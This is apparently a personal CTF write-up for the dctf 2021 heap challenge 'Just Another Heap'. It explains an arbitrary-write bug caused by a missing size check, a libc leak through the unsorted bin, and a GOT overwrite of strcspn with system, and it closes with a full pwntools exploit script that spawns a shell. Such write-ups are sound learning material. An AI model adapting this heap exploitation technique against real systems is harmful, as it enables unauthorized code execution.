---
title: "2021 dctf Write-up"
date: 2021-05-17T19:18:39+09:00
layout: post
categories: ["ctf"]
tags: []
---
## Tasks

- Pwn💻
  - Just Another Heap (500pts)

## Just Another Heap (500pts)

I couldn't solve this one prob in time, but I want to post this solving skills. It's hard to find, but when I found it, It's very simple Arbitrary Write.

![1.png](/images/2021-dctf/1.png)

- It has 5 user functions(create, relive, forget, change, listing).

`create()` has a role that makes malloc_frame(0x20) and  malloc_userinput(size).
The point is, this prob has a unique fading input with this part.

```c
puts("How long is your memory");
input_lu(&size);                          // no size check
malloc_user = malloc(size);               // size > 0x308 / forget -> unsorted bin
puts("Sometimes our memories fade and we only remember parts of them.");
input_lu(&fade);                          // no filter
puts("Would you like to leave some space at the beginning in case you remember later?");
if ( fade <= size )
{
  if ( malloc_user )
  {
    for ( i = 0; i < fade; ++i )
      malloc_user[i] = '_';
  }
  malloc_user += fade;
```

memories will be faded `fade` bytes with `_`, and user input is behind the `_` strings if malloc_user is NOT 0.
So, if `malloc(size)` returns `0`, I can overwrite anywhere.

### Exploit

First, set chunks that `size>0x408` between 2 small chunks
to leak libc from `main_arena+xx`.

And make 1 tcache and `0x410` unsorted bin. Now `main_arena+xx` has written in unsorted bin.

and if I rewrite and use `change()` to fill fade bytes and get libc addr with `relive()` function.

- `change()` function : overwrite from the beginning or behind fade `_` strings
- `relive()` function : print user input with fade `_` string

Finally, Use This mentioned skills to do GOT Overwriting.

> memories will be faded `fade` bytes with `_`, and user input is behind the `_` strings
> if malloc_user is NOT 0.
> So, if `malloc(size)` returns `0`, I can overwrite anywhere.

input `/bin/sh\x00` in malloc_frame[] and program will call `strcspn(addr,'\n')`. Get The Shell.

### Code

Here is the Exploit Code.

```py
from pwn import *

context.log_level='debug'

def create(idx, name, size, hide, cont, important, recent):
  p.recv()
  p.sendline(str(1))
  p.recv()
  p.sendline(str(idx))
  p.recv()
  p.sendline(name)
  p.recv()
  p.sendline(str(size))
  p.recv()
  p.sendline(str(hide))
  p.recv()
  p.sendline(cont)
  p.recv()
  p.sendline(important)
  p.recv()
  p.sendline(recent)

def relive(idx):
  p.recv()
  p.sendline(str(2))
  p.recv()
  p.sendline(str(idx))

def change(idx, cont):
  p.recv()
  p.sendline(str(4))
  p.recv()
  p.sendline(str(idx))
  p.recv()
  p.sendline("Y")
  p.recv()
  p.send(cont)

def forget(idx):
  p.recv()
  p.sendline(str(3))
  p.recv()
  p.sendline(str(idx))

def listing():
  p.recv()
  p.sendline(str(5))

p=remote("dctf-chall-just-another-heap.westeurope.azurecontainer.io", 7481)
#p=process("./just_another_heap")
e=ELF("./just_another_heap")
l=e.libc

create(0, "A"*8, 0x20, 0, "1234", "N", "N")
create(1, "B"*8, 0x410, 0, "1234", "N", "N")
create(2, "A"*8, 0x20, 0, "1234", "N", "N")
forget(0)
forget(1)
#pause()
create(3, "B"*8, 0x410, 6, "", "N", "N")
#pause()
change(3,"A"*8)
relive(3)

p.recvuntil("A"*7+" ")
libc_base=u64(p.recv(6).ljust(8,'\x00'))-0x3ebca0

print hex(libc_base)

create(4, "C"*8, libc_base, e.got['strcspn'], p64(libc_base+l.sym['system']), "N", "N")
pause()
p.recv()
p.sendline(str(1))
p.recv()
p.sendline("//bin/sh\x00")
p.interactive()
```
